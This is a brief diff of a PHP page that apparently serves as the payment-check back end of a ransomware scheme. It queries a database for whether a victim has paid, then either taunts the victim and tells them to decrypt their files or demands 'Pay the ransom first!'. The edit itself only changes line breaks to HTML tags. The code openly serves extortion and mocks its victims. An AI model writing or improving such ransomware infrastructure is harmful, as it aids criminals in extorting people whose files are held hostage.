@@ -10,7 +10,7 @@
 		$result = pg_query($dbconn,$query);
 		$tmp = pg_fetch_row($result)[0];
 		if($tmp == 'Yes'){
-			echo "Congratulations!\n You have paid the ransom!\n Decrypt your files now and don't be dumb next time.\n Hope you learned your lesson :)";
+			echo "Congratulations!<br>You have paid the ransom!<br>Decrypt your files now and don't be dumb next time.<br>Hope you learned your lesson :)";
 		}
 		else{
 			echo "Pay the ransom first!";
